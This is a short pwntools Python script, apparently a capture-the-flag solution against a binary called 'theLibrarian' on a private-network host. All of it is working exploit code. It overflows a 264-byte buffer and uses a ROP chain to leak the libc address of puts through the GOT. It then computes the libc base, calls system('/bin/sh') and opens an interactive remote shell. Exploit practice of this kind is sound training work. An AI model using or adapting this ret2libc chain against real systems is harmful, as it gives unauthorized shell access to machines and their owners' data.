from pwn import *
import warnings

context.log_level = 'critical'
context.arch = 'amd64'

context.binary = binary = ELF('./theLibrarian', checksec=False)
libc = ELF('./libc.so.6')
rop = ROP(binary)


address = '10.10.0.136'
port = 9008
target = remote(address, port)


overflow = b'A' * 264

pop_rdi_addr = p64(rop.find_gadget(['pop rdi', 'ret'])[0])
ret_addr = p64(rop.find_gadget(['ret'])[0])
plt_puts_addr = p64(binary.plt.puts)
got_puts_addr = p64(binary.got.puts)
main_addr = p64(binary.symbols.main)


payload1 = overflow
payload1 += pop_rdi_addr
payload1 += got_puts_addr
payload1 += plt_puts_addr
payload1 += main_addr


target.recvuntil(b'Again? Where this time? : \n')
target.sendline(payload1)
target.recvuntil(b'ok, let\'s go!\n\n')


puts_libc_addr = u64(target.recvuntil(b'\n')[:-1].ljust(8, b'\x00'))
libc_base_addr = puts_libc_addr - libc.symbols.puts

system_libc_addr = p64(libc_base_addr + libc.symbols.system)
bin_sh_libc_addr = p64(libc_base_addr + next(libc.search(b'/bin/sh\x00')))

payload2 = overflow
payload2 += ret_addr
payload2 += pop_rdi_addr
payload2 += bin_sh_libc_addr
payload2 += system_libc_addr

target.recvuntil(b'Again? Where this time? : \n')
target.sendline(payload2)
target.recvuntil(b'ok, let\'s go!\n\n')
target.interactive()
